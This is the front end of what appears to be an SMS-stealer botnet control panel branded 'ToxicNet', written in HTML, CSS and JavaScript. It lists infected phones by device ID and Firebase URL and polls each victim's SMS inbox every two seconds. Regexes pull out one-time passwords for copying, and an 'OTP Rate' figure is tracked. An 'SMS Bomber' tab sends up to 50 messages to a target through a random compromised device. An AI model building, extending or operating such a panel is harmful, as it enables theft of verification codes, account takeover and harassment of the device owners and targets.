.filter-btn.active.offline-filter{background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.3)}

.search-box{margin-bottom:20px;position:relative}
.search-box input{width:100%;padding:16px 20px 16px 48px;border-radius:16px;border:1px solid #334155;background:#1e293b;color:#f1f5f9;font-size:15px;transition:.2s}
.search-box input:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.1)}
.search-box::before{content:"🔍";position:absolute;left:18px;top:50%;transform:translateY(-50%);font-size:16px;opacity:0.5}

.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
.list-header h2{font-size:18px;font-weight:700}
.count{font-size:12px;font-weight:700;color:#3b82f6;background:rgba(59,130,246,.1);padding:4px 12px;border-radius:20px}

.num-card{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:16px;margin-bottom:12px;display:flex;align-items:center;gap:16px;transition:.2s;animation:slideUp 0.3s ease both}
.num-card:hover{border-color:#475569;box-shadow:0 4px 12px rgba(0,0,0,0.1);transform:translateY(-2px)}
.num-icon{width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700;flex-shrink:0;background:rgba(16,185,129,.1);color:#10b981;border:1px solid rgba(16,185,129,.2)}
.num-icon.offline-icon{background:rgba(239,68,68,.1);color:#ef4444;border-color:rgba(239,68,68,.2)}
.num-icon.unknown-icon{background:rgba(148,163,184,.1);color:#94a3b8;border-color:rgba(148,163,184,.2)}
.num-info{flex:1;min-width:0;cursor:pointer}
.num-title{font-size:16px;font-weight:700;color:#f1f5f9;margin-bottom:6px;display:flex;align-items:center;gap:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.num-title.unknown{color:#94a3b8;font-style:italic;font-weight:500}
.num-sub{display:flex;gap:8px;flex-wrap:wrap}
.pill{font-size:11px;font-weight:600;padding:4px 10px;border-radius:8px;background:#0f172a;color:#94a3b8;border:1px solid #334155;display:inline-flex;align-items:center;gap:4px}
.pill.otp{background:rgba(139,92,246,.1);color:#8b5cf6;border-color:rgba(139,92,246,.2)}

.badge{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:700;padding:6px 12px;border-radius:10px;flex-shrink:0}
.badge.online{background:rgba(16,185,129,.1);color:#10b981;border:1px solid rgba(16,185,129,.2)}
.badge.offline{background:rgba(239,68,68,.1);color:#ef4444;border:1px solid rgba(239,68,68,.2)}
.badge .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
.badge.online .dot{animation:pulse 1.5s infinite}

.card-actions{display:flex;gap:8px;flex-shrink:0}
.icon-btn{width:40px;height:40px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:18px;background:#334155;color:#f1f5f9;transition:.2s}
.icon-btn:hover{background:#475569}
.icon-btn.send-btn{background:#3b82f6;color:#fff;box-shadow:0 4px 10px rgba(59,130,246,.3)}
.icon-btn.send-btn:hover{background:#2563eb}

.sms-sender-box{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:24px;margin-bottom:24px;animation:slideUp 0.4s ease}
.sms-sender-box h2{font-size:18px;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:10px}
.sms-sender-box p{font-size:14px;color:#94a3b8;margin-bottom:20px}
.form-group{margin-bottom:16px}
.form-group label{display:block;font-size:12px;font-weight:600;color:#94a3b8;margin-bottom:8px}
.form-group input, .form-group textarea{width:100%;padding:14px 16px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;font-size:15px;transition:.2s}
.form-group input:focus, .form-group textarea:focus{border-color:#3b82f6;box-shadow:0 0 0 4px rgba(59,130,246,.1)}
.form-group textarea{resize:vertical;min-height:100px}
.btn{padding:16px;border-radius:12px;font-size:15px;font-weight:700;transition:.2s;display:flex;align-items:center;justify-content:center;gap:8px;width:100%}
.btn-primary{background:#3b82f6;color:#fff}
.btn-primary:hover{background:#2563eb;box-shadow:0 8px 16px rgba(59,130,246,.2)}
.btn-primary:disabled{opacity:.6;cursor:not-allowed;box-shadow:none}

/* INBOX */
.inbox-header{background:#1e293b;border:1px solid #334155;border-radius:20px;padding:20px;margin-bottom:16px;display:flex;align-items:center;gap:16px;animation:slideUp 0.3s ease}
.back-btn{width:44px;height:44px;border-radius:12px;background:#0f172a;border:1px solid #334155;color:#f1f5f9;display:flex;align-items:center;justify-content:center;font-size:20px;transition:.2s}
.back-btn:hover{background:#334155}
.inbox-num{font-size:20px;font-weight:800;margin-bottom:4px}
.inbox-status{font-size:12px;font-weight:600;color:#10b981;display:flex;align-items:center;gap:6px}
.inbox-status.offline{color:#ef4444}

.sms-list{display:flex;flex-direction:column;gap:12px}
.sms-item{background:#1e293b;border:1px solid #334155;border-radius:16px;padding:18px;animation:slideUp 0.3s ease}
.sms-item.fresh{border-left:4px solid #3b82f6}
.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px}
.sender{font-size:14px;font-weight:700;color:#f1f5f9}
.sms-time{font-size:12px;color:#94a3b8;font-weight:500}
.sms-body{font-size:15px;color:#cbd5e1;line-height:1.6;word-break:break-word;white-space:pre-wrap}
.otp-highlight{background:rgba(139,92,246,.2);color:#a78bfa;padding:2px 8px;border-radius:6px;font-weight:700}
.otp-copy-btn{margin-top:14px;padding:10px 16px;border-radius:10px;background:#334155;color:#f1f5f9;font-size:13px;font-weight:600;display:inline-flex;align-items:center;gap:8px;transition:.2s}
.otp-copy-btn:hover{background:#475569}

.hidden{display:none !important}

/* MODAL */
.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:200;padding:20px;backdrop-filter:blur(4px)}
.modal-overlay.show{display:flex;animation:fadeIn 0.2s ease}
.modal-content{background:#1e293b;border:1px solid #334155;border-radius:24px;padding:24px;width:100%;max-width:400px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5);animation:slideUp 0.3s ease}
.modal-content h3{font-size:20px;font-weight:800;margin-bottom:8px}
.modal-content p{font-size:13px;color:#94a3b8;margin-bottom:20px}
.modal-content input, .modal-content textarea{width:100%;padding:14px;border-radius:12px;border:1px solid #334155;background:#0f172a;color:#f1f5f9;font-size:15px;margin-bottom:12px}
.modal-btns{display:flex;gap:10px;margin-top:16px}
.modal-btns button{flex:1;padding:14px;border-radius:12px;font-weight:700}
</style></head><body>

<div class="topbar">
<div class="brand">☣️ Toxic<span>Net</span></div>
<div class="top-actions">
<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()">⟳</button>
<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
</div>
</div>

<div class="nav">
  <div class="nav-link active" id="tab-num" onclick="switchTab('num')">📱 Numbers</div>
  <div class="nav-link" id="tab-sms" onclick="switchTab('sms')">💣 SMS Sender</div>
  <div class="nav-link" id="tab-otp" onclick="switchTab('otp')">🔑 Personal OTP</div>
</div>

<div class="container">

<!-- TAB NUMBERS -->
<div id="view-num">
  <div id="session-banner-wrap"></div>
  
  <div id="list-view">
    <div class="stats">
      <div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
      <div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
      <div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
      <div class="stat otp">
        <div class="label" style="margin-bottom:2px">OTP Rate</div>
        <svg viewBox="0 0 36 36" class="circular-chart">
          <path class="circle-bg" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
          <path class="circle" id="otp-circle" stroke-dasharray="0, 100" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
          <text x="18" y="18" class="otp-text" id="s-otp">0%</text>
        </svg>
      </div>
    </div>

    <div class="filter-bar">
      <button class="filter-btn active" id="filter-all" onclick="setFilter('all')">All</button>
      <button class="filter-btn online-filter" id="filter-online" onclick="setFilter('online')">🟢 Online</button>
      <button class="filter-btn offline-filter" id="filter-offline" onclick="setFilter('offline')">🔴 Offline</button>
    </div>

    <div class="search-box">
      <input id="search-num" placeholder="Search number or device..." oninput="renderNumbers()">
    </div>

    <div id="loading-text" style="text-align:center;padding:40px;color:#94a3b8;font-weight:500">
      <span class="spinner-dark" style="display:inline-block;margin-right:8px"></span> Initializing...
    </div>

    <div id="list-content" class="hidden">
      <div class="list-header">
        <h2>Numbers</h2>
        <span class="count" id="num-count">0</span>
      </div>
      <div id="num-list"></div>
    </div>
  </div>

  <div id="inbox-view" class="hidden">
    <div class="inbox-header">
      <button class="back-btn" onclick="backToList()">←</button>
      <div style="flex:1">
        <div class="inbox-num" id="inbox-num">---</div>
        <div class="inbox-status" id="inbox-status"><span class="pulse-dot"></span> <span id="inbox-status-text">Online</span></div>
      </div>
      <button class="icon-btn" onclick="loadInbox(true)">⟳</button>
    </div>
    <div id="sms-container"></div>
  </div>
</div>

<!-- TAB SMS SENDER -->
<div id="view-sms" class="hidden">
  <div class="sms-sender-box">
    <h2>💣 SMS Bomber</h2>
    <p id="online-dev-text">Memuat device online...</p>
    
    <div class="form-group">
      <label>Enter Number (Target)</label>
      <input type="tel" id="sms-target" placeholder="+91 9876543210">
    </div>

    <div class="form-group">
      <label>Enter Message</label>
      <textarea id="sms-message" placeholder="Type your message here..."></textarea>
    </div>

    <div class="form-group">
      <label>Kitna bar send karna hai? (Max 50)</label>
      <input type="number" id="sms-count" value="1" min="1" max="50">
    </div>

    <button class="btn btn-primary" onclick="sendSms()">🚀 Send Message</button>
  </div>
</div>

<!-- TAB PERSONAL OTP -->
<div id="view-otp" class="hidden">
  <div class="sms-sender-box">
    <h2>🔑 Add Personal Firebase</h2>
    <p>Tambahkan URL Firebase kamu sendiri untuk memantau OTP masuk secara pribadi.</p>
    
    <div class="form-group">
      <input id="fb-url" placeholder="https://xxx.firebaseio.com" type="url" autocomplete="off">
    </div>
    
    <button class="btn btn-primary" onclick="addFirebase()">Add Firebase</button>
    <div id="add-msg" style="margin-top:12px;font-size:13px;text-align:center;color:#10b981;font-weight:600;display:none"></div>
  </div>
</div>

</div>

<!-- MODAL SEND SMS FROM CARD -->
<div class="modal-overlay" id="sms-modal">
  <div class="modal-content">
    <h3>📩 Send Message</h3>
    
    <div class="form-group" style="margin-top:16px">
      <label style="font-size:12px;color:#94a3b8;margin-bottom:6px;display:block">Target Number</label>
      <input type="tel" id="modal-target-input" placeholder="+91 9876543210">
    </div>
    
    <div class="form-group">
      <label style="font-size:12px;color:#94a3b8;margin-bottom:6px;display:block">Message</label>
      <textarea id="modal-message" placeholder="Type your message here..." style="min-height:100px"></textarea>
    </div>
    
    <div class="modal-btns">
      <button class="btn" style="background:#334155;color:#f1f5f9" onclick="closeModal()">Cancel</button>
      <button class="btn btn-primary" onclick="confirmSingleSend()">Send Now</button>
    </div>
  </div>
</div>

<!-- MODAL STATUS (SHEET SHOW) -->
<div class="modal-overlay" id="status-modal">
  <div class="modal-content" style="text-align:center">
    <div id="status-icon" style="font-size:48px;margin-bottom:12px">✅</div>
    <h3 id="status-title" style="margin-bottom:8px">Berhasil!</h3>
    <p id="status-desc" style="margin-bottom:24px;font-size:14px;color:#cbd5e1">Pesan berhasil terkirim.</p>
    <button class="btn btn-primary" onclick="document.getElementById('status-modal').classList.remove('show')">Tutup</button>
  </div>
</div>

<div id="toast" class="toast"></div>

<script>
let allNumbers = [];
let numbers = [];
let currentNum = null;
let refreshTimer = null;
let lastSig = '';
let lastInboxSig = '';
let allInboxMsgs = [];
let panelState = {active:true, expires_at:0, passwordless:true, bomber_active:true};
let currentFilter = 'all';
let modalTarget = null;
let modalDevId = null;
let modalFbUrl = null;

const $ = id => document.getElementById(id);
function toast(text){
  const t = $('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500);
}

function switchTab(tab){
  ['num', 'otp', 'sms'].forEach(t => {
    $('view-' + t).classList.add('hidden');
    $('tab-' + t).classList.remove('active');
  });
  $('view-' + tab).classList.remove('hidden');
  $('tab-' + tab).classList.add('active');
  if(tab === 'sms') updateSenderUI();
}

function updateSenderUI(){
  const onlineDevs = allNumbers.filter(n => n.online === true).length;
  $('online-dev-text').innerHTML = `<span style="color:#10b981;font-weight:700">${onlineDevs} Devices Online</span> (Pesan akan dikirim via random device)`;
}

function setFilter(filter){
  currentFilter = filter;
  ['all', 'online', 'offline'].forEach(f => {
    $('filter-' + f).classList.remove('active');
  });
  $('filter-' + filter).classList.add('active');
  renderNumbers();
}

function showStatusModal(isOk, title, desc){
  $('status-icon').textContent = isOk ? '✅' : '❌';
  $('status-title').textContent = title;
  $('status-title').style.color = isOk ? '#10b981' : '#ef4444';
  $('status-desc').textContent = desc;
  $('status-modal').classList.add('show');
}

async function sendSms(){
  const target = $('sms-target').value.trim();
  const msg = $('sms-message').value.trim();
  const count = parseInt($('sms-count').value) || 1;
  
  if(!target){ toast('❌ Target number required'); return; }
  if(!msg){ toast('❌ Message required'); return; }
  if(count > 1 && !panelState.bomber_active){ toast('❌ Bomber disabled by Admin'); return; }

  const onlineDevs = allNumbers.filter(n => n.online === true);
  if(onlineDevs.length === 0){ toast('❌ No online devices available to send SMS'); return; }
  const randomDev = onlineDevs[Math.floor(Math.random() * onlineDevs.length)];

  const btn = document.querySelector('#view-sms .btn-primary');
  const originalTxt = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> Sending...';

  try{
    const r = await fetch('/api/sms/send', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ fb_url: randomDev.firebase, device_id: randomDev.device_id, target: target, message: msg, count })
    });
    const d = await r.json();
    if(d.success){ 
      showStatusModal(true, 'Berhasil!', `Berhasil mengirim ${d.count}x pesan ke ${target} melalui device ${randomDev.number}`); 
      $('sms-target').value = ''; $('sms-message').value = ''; $('sms-count').value = 1;
    }
    else { showStatusModal(false, 'Gagal', d.error || 'Unknown error'); }
  }catch(e){ showStatusModal(false, 'Error', 'Network error'); }
  
  btn.disabled = false;
  btn.innerHTML = originalTxt;
}

function openSendModal(number, devId, fbUrl){
  modalTarget = number;
  modalDevId = devId;
  modalFbUrl = fbUrl;
  
  if((number || '').startsWith('UNKNOWN-')) {
    $('modal-target-input').value = '';
  } else {
    $('modal-target-input').value = number;
  }
  
  $('modal-message').value = '';
  $('sms-modal').classList.add('show');
}

function closeModal(){ $('sms-modal').classList.remove('show'); }

async function confirmSingleSend(){
  const msg = $('modal-message').value.trim();
  const finalTarget = $('modal-target-input').value.trim();
  
  if(!msg){ toast('❌ Message required'); return; }
  if(!finalTarget){ toast('❌ Target number required'); return; }
  
  closeModal();
  toast('⏳ Sending...');
  
  try{
    const r = await fetch('/api/sms/send', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ fb_url: modalFbUrl, device_id: modalDevId, target: finalTarget, message: msg, count: 1 })
    });
    const d = await r.json();
    if(d.success){ showStatusModal(true, 'Berhasil!', `Pesan terkirim ke ${finalTarget}`); }
    else { showStatusModal(false, 'Gagal', d.error || 'Unknown error'); }
  }catch(e){ showStatusModal(false, 'Error', 'Network error'); }
}

async function checkConn(){
  try{
    const r = await fetch('/api/conn');
    const d = await r.json();
    const badge = $('conn-badge');
    const txt = $('conn-text');
    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'Live'; }
    else { badge.className = 'conn offline'; txt.textContent = 'Off'; }
  }catch(e){}
}

async function loadPanelState(){
  try{
    const r = await fetch('/api/panel/status_public');
    const d = await r.json();
    if(d.success){
      panelState = d;
      const wrap = $('session-banner-wrap');
      if(d.passwordless){
        wrap.innerHTML = '<div class="session-banner"><span class="pulse-dot"></span>🔓 Passwordless Mode · Access Granted</div>';
      } else if(d.expires_at > 0){
        const remaining = Math.max(0, d.expires_at - Math.floor(Date.now()/1000));
        const hrs = Math.floor(remaining/3600);
        const mins = Math.floor((remaining%3600)/60);
        wrap.innerHTML = `<div class="session-banner temp"><span class="pulse-dot" style="background:#f59e0b"></span>⏱ Temp Access · ${hrs}h ${mins}m Remaining</div>`;
      } else { wrap.innerHTML = ''; }
    }
  }catch(e){}
}

async function loadNumbers(){
  try{
    const r = await fetch('/api/numbers');
    const d = await r.json();
    if(!d.success){
      if(d.error && d.error.includes('deactivated')){ document.body.innerHTML = '<div style="padding:40px;text-align:center;color:#ef4444;font-size:16px;font-weight:700">🚫 PANEL DEACTIVATED BY ADMIN</div>'; return; }
      $('loading-text').textContent = '❌ '+(d.error||'ERROR');
      return;
    }
    allNumbers = d.numbers || [];
    $('s-total').textContent = d.total;
    $('s-online').textContent = d.online;
    $('s-offline').textContent = d.offline;
    
    const otpRate = d.otp_rate || 0;
    $('s-otp').textContent = otpRate + '%';
    $('otp-circle').setAttribute('stroke-dasharray', `${otpRate}, 100`);

    if(allNumbers.length > 0){
      $('loading-text').classList.add('hidden');
      $('list-content').classList.remove('hidden');
      const sig = allNumbers.length + '|' + d.online + '|' + d.otp_rate + '|' + currentFilter;
      if(sig !== lastSig){ lastSig = sig; renderNumbers(); updateSenderUI(); }
    } else if(d.loading){
      $('loading-text').classList.remove('hidden');
    }
  }catch(e){ $('loading-text').textContent = '❌ NETWORK ERROR'; }
}

function renderNumbers(){
  const q = ($('search-num').value || '').toLowerCase();
  const box = $('num-list');
  
  let filtered = allNumbers;
  if(currentFilter === 'online') filtered = filtered.filter(n => n.online);
  if(currentFilter === 'offline') filtered = filtered.filter(n => !n.online);
  if(q) filtered = filtered.filter(n => (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
  
  $('num-count').textContent = filtered.length;
  
  if(filtered.length === 0){ box.innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8;font-size:14px">No numbers found</div>'; return; }
  
  box.innerHTML = filtered.map(n => {
    const isOnline = n.online === true;
    const isUnknown = (n.number || '').startsWith('UNKNOWN-');
    const iconCls = isUnknown ? 'unknown-icon' : (isOnline ? '' : 'offline-icon');
    const badgeCls = isOnline ? 'online' : 'offline';
    const titleCls = isUnknown ? 'unknown' : '';
    const iconEmoji = isUnknown ? '❓' : (isOnline ? '📱' : '📴');
    
    return `
      <div class="num-card">
        <div class="num-icon ${iconCls}">${iconEmoji}</div>
        <div class="num-info" onclick="openInbox('${n.number}', '${n.device_id}', '${n.firebase}', ${isOnline})">
          <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
          <div class="num-sub">
            <span class="pill">✉️ ${n.msg_count} SMS</span>
            ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
          </div>
        </div>
        <div class="card-actions">
          <button class="icon-btn send-btn" onclick="event.stopPropagation();openSendModal('${n.number}', '${n.device_id}', '${n.firebase}')" title="Send SMS">💬</button>
        </div>
        <div class="badge ${badgeCls}"><span class="dot"></span>${isOnline ? 'Online' : 'Offline'}</div>
      </div>`;
  }).join('');
}

async function openInbox(num, devId, fbUrl, isOnline){
  currentNum = { number: num, device_id: devId, firebase: fbUrl, online: isOnline };
  lastInboxSig = ''; allInboxMsgs = [];
  
  $('list-view').classList.add('hidden');
  $('inbox-view').classList.remove('hidden');
  
  const inboxNumEl = $('inbox-num');
  inboxNumEl.textContent = num;
  if((num || '').startsWith('UNKNOWN-')){ inboxNumEl.classList.add('unknown'); } else { inboxNumEl.classList.remove('unknown'); }
  
  const statusEl = $('inbox-status');
  const statusTxt = $('inbox-status-text');
  if(isOnline){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
  
  $('sms-container').innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8"><span class="spinner-dark" style="display:inline-block;margin-right:8px"></span> Loading...</div>';
  
  await loadInbox(false);
  if(refreshTimer) clearInterval(refreshTimer);
  refreshTimer = setInterval(()=>loadInbox(false), 2000);
}

async function loadInbox(showLoader){
  if(!currentNum) return;
  if(showLoader){ $('sms-container').innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8"><span class="spinner-dark" style="display:inline-block;margin-right:8px"></span> Refreshing...</div>'; }
  try{
    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number));
    const d = await r.json();
    if(!d.success){ $('sms-container').innerHTML = '<div style="text-align:center;padding:40px;color:#ef4444">❌ '+(d.error||'ERROR')+'</div>'; return; }
    const msgs = d.messages || []; allInboxMsgs = msgs;
    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
    if(sig !== lastInboxSig){ lastInboxSig = sig; renderMessages(); }
  }catch(e){}
}

function renderMessages(){
  const box = $('sms-container');
  const now = Math.floor(Date.now() / 1000);
  let msgs = [...allInboxMsgs].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 60);
  
  if(!msgs.length){ box.innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8">📭 No SMS messages found</div>'; return; }
  
  box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
    const otp = m.otp || extractOtp(m.message);
    let body = otp ? escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`) : escapeHtml(m.message);
    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : '';
    const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
    const timeStr = m.date_string ? m.date_string : fmtTime(ts);
    
    return `
      <div class="sms-item ${isFresh?'fresh':''}">
        <div class="sms-head">
          <div class="sender">${escapeHtml(m.from || 'UNKNOWN')}</div>
          <div class="sms-time">${escapeHtml(timeStr)}</div>
        </div>
        <div class="sms-body">${body}</div>
        ${copyBtn}
      </div>`;
  }).join('') + '</div>';
}

function backToList(){
  $('inbox-view').classList.add('hidden');
  $('list-view').classList.remove('hidden');
  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
  currentNum = null;
}

function extractOtp(text){
  if(!text) return '';
  const t = String(text);
  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i); if(m) return m[1];
  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i); if(m) return m[1];
  m = t.match(/#(\d{4,8})/); if(m) return m[1];
  return '';
}

function fmtTime(ts){
  if(!ts) return '';
  try{
    let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
    const d = new Date(t * 1000);
    return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' });
  }catch(e){ return String(ts); }
}

function copyOtp(code){
  if(navigator.clipboard){ navigator.clipboard.writeText(code).then(()=>toast('✅ COPIED: ' + code)).catch(()=>{}); }
}

function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }

async function addFirebase(){
  const url = $('fb-url').value.trim();
  if(!url) return;
  const r = await fetch('/api/otp/add', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url}) });
  const d = await r.json();
  if(d.success){ $('add-msg').style.display='block'; $('add-msg').textContent = '✅ Firebase added successfully!'; $('fb-url').value=''; setTimeout(()=>$('add-msg').style.display='none', 3000); }
  else { toast('❌ ' + d.error); }
}

// Init
checkConn();
loadPanelState();
loadNumbers();
setInterval(checkConn, 8000);
setInterval(loadPanelState, 5000);
setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
</script>
</body>
</html>
"""
